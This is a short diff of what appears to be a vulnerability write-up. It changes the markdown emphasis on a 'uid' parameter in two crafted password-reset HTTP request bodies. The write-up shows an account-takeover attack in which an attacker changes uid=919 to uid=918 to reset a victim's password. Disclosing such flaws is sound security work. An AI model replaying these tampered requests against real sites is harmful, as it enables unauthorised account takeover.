@@ -76,7 +76,7 @@ Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 192
 
-password1=test@123&password2=test@123&csrf=yk+pkQZwwDXoeTFS5mlGA/Ygbd+yX3jMESLjQwS/+L6HF2gC7YJexTzh/SENodjI&`uid=919`&reset_code=cd12ab0b-8c1b-4afd-a76f-43c69b48bd1d&submit=reset 
+password1=test@123&password2=test@123&csrf=yk+pkQZwwDXoeTFS5mlGA/Ygbd+yX3jMESLjQwS/+L6HF2gC7YJexTzh/SENodjI&**uid=919**&reset_code=cd12ab0b-8c1b-4afd-a76f-43c69b48bd1d&submit=reset 
 
 ```
 Crafted Request for email Id sectest24@gmail.com (Victim's email ID).
@@ -94,7 +94,7 @@ Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 192
 
-password1=test@123&password2=test@123&csrf=yk+pkQZwwDXoeTFS5mlGA/Ygbd+yX3jMESLjQwS/+L6HF2gC7YJexTzh/SENodjI&`uid=918`&reset_code=cd12ab0b-8c1b-4afd-a76f-43c69b48bd1d&submit=reset
+password1=test@123&password2=test@123&csrf=yk+pkQZwwDXoeTFS5mlGA/Ygbd+yX3jMESLjQwS/+L6HF2gC7YJexTzh/SENodjI&**uid=918**&reset_code=cd12ab0b-8c1b-4afd-a76f-43c69b48bd1d&submit=reset
 ```
 
 This is how I successfully change the victim user password and take full control of his account.
